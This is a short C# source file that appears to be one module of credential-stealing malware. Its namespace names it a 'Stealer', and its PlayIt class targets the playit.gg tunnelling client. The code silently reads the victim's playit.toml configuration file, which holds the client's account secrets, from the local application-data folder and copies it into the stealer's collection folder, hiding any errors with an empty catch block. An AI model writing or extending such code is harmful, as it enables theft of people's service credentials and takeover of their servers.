using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Server;

internal class PlayIt
{
	public static void Start()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "playit_gg", "playit.toml");
			if (File.Exists(path))
			{
				DynamicFiles.WriteAllBytes(Path.Combine("Server", "PlayIt", "playit.toml"), File.ReadAllBytes(path));
			}
		}
		catch
		{
		}
	}
}
